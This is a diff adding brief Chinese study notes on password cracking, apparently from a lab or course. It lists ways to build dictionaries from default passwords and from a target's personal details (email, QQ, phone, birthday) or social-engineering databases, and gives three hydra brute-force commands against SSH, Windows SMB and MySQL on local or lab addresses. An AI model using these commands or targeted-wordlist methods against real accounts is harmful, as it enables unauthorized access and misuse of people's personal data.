@@ -1,0 +1,12 @@
+通用模式：常见密码，默认密码；
+定制模式：邮箱，qq，电话，生日；
+主动收集
+使用社工库
+社工字典生成
+
+破解ssh登录密码：
+hydra -l kali -p password.txt -t 3 -e ns 127.0.0.1 ssh
+破解windows登录密码：
+hydra -l administrator -P password.txt -t 3 -e ns 192.168.140.130 smb2
+破解数据库登录密码：
+hydra -l root -P password.txt -t 3 -e ns localhost mysql
